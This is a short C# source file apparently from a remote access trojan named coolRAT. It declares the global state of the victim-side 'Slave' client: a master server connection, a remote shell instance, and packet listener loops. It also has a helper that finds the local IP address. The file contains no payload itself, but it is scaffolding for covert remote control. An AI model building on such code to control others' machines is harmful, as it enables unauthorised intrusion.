using coolRAT.Libs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static coolRAT.Libs.Shell;

namespace coolRAT.Slave
{
    public static class SlaveGlobalData
    {
        public static Client LocalClient;
        public static MasterServerInfo MasterServerInfo;
        public static Shell ShellInstance;
        public static ShellOutputChangedHandler ShellOutputChangedHandler;
        public static PacketListenerLoop MainListenerLoop;
        public static PacketListenerLoop ShellListenerLoop;
        public static IPEndPoint LocalEndpoint;
        public static PingService PingService;

        public static void FindLocalEndPoint()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                LocalEndpoint = socket.LocalEndPoint as IPEndPoint;
            }
        }
    }
}
